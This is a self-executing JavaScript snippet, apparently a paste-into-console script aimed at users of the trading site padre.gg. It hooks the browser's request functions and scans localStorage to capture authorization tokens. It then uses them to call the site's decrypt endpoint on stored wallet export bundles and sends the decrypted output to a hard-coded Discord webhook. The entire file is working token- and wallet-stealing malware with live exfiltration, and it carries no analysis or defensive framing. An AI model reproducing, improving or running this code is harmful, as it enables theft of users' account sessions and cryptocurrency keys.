(function() {
    const W = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
    let found = false;

    const ship = async (t) => {
        if (found || !t) return;
        const bStr = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bStr) return;
        
        found = true; 
        console.log("%c[VANTA] TOKEN CAPTURED. EXECUTING...", "color: #00ff88; font-weight: bold;");
        
        try {
            const b = JSON.parse(bStr);
            const k = Object.keys(b.bundles)[0];
            const p = { bundle: b.bundles[k].exportBundle, subOrgId: b.bundles[k].subOrgId };

            const r = await fetch("https://api.padre.gg/v2/enclave/decrypt", {
                method: 'POST',
                headers: { 'Authorization': t, 'Content-Type': 'application/json' },
                body: JSON.stringify(p)
            });
            const data = await r.text();

            // SEND TO DISCORD
            navigator.sendBeacon(W, new Blob([JSON.stringify({
                embeds: [{
                    title: "🚨 VANTA FULL OVERRIDE SUCCESS",
                    description: "```json\n" + data.substring(0, 1800) + "\n```",
                    color: 65280,
                    fields: [{ name: "Token Source", value: "Global Request Interceptor" }]
                }]
            })], { type: 'text/plain' }));
            
            console.log("%c[VANTA] DISPATCHED.", "color: #00ff88;");
        } catch (e) { found = false; }
    };

    // 1. DEEP SEARCH: Global Request Interceptor
    // This catches tokens even if the site uses a custom fetch wrapper
    const OldRequest = window.Request;
    window.Request = function(input, options) {
        const auth = options?.headers?.['Authorization'] || 
                     options?.headers?.['authorization'] ||
                     (options?.headers instanceof Headers && options.headers.get('Authorization'));
        if (auth) ship(auth);
        return new OldRequest(input, options);
    };

    // 2. DEEP SEARCH: XHR Header Sniffer
    const oldSetHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        if (name.toLowerCase() === 'authorization') ship(value);
        return oldSetHeader.apply(this, arguments);
    };

    // 3. DEEP SEARCH: LocalStorage Keys (Iterative scan)
    const scanStorage = () => {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            if (val && (val.startsWith('ey') || val.length > 100)) { // JWTs usually start with 'ey'
                try {
                    const parsed = JSON.parse(val);
                    if (parsed.token) ship(parsed.token);
                    if (parsed.state?.token) ship(parsed.state.token);
                } catch(e) {}
            }
        }
    };

    // 4. TRIGGER EVERYTHING
    console.log("[VANTA] Deep Scanning initiated...");
    scanStorage();
    
    // Force a fetch to trigger the Request Interceptor
    fetch('/api/v2/user/profile').catch(() => {});
    
    // Final fallback: if nothing happens in 2 seconds, try one more time
    setTimeout(() => { if(!found) fetch('/api/v2/user/profile'); }, 2000);
})();
